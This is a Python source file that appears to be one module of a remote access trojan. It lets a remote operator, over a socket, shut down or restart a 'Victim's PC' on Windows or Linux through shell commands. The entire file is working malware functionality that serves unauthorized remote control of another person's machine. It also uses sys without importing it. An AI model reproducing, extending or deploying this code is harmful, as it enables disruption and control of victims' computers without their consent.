#!/bin/env python3

import platform
import os

def shutPC(con):
    con.sendall(b"\nShutdown Victim's PC? (yes/no): ")
    shutdown = con.recv(2048)
    try:
        shutdown = str(shutdown.decode().strip())
        if shutdown == "yes":
            if platform.system() == "Windows":
                os.system("shutdown /s /t 1")
            elif platform.system() == "Linux":
                os.system('systemctl poweroff') 
        else:
            con.sendall(b'\nOperation Cancelled')
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def resPC(con):
    con.sendall(b"\nRestart Victim's PC? (yes/no): ")
    restart = con.recv(2048)
    try:
        restart = str(restart.decode().strip())
        if restart == "yes":
                if platform.system() == "Windows":
                    os.system("shutdown /r /t 1")
                elif platform.system() == "Linux":
                    os.system('systemctl reboot -i')
        else:
            con.sendall(b'\nOperation Cancelled')
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')

def sysControl(con):
    menu = b"\n1. Shutdown Victim's PC\n2. Restart Victim's PC\n"
    con.sendall(menu)
    con.sendall(b"\nSpecify Options: ")
    opt = con.recv(1024)
    try:
        opt = opt.decode()
        opt = int(opt)
        if(opt == 1):
            shutPC(con)
        elif(opt == 2):
            resPC(con)
    except ValueError:
        con.sendall(b"\nPlese only send integer value representing each option\n")
    except KeyboardInterrupt:
        sys.exit(0)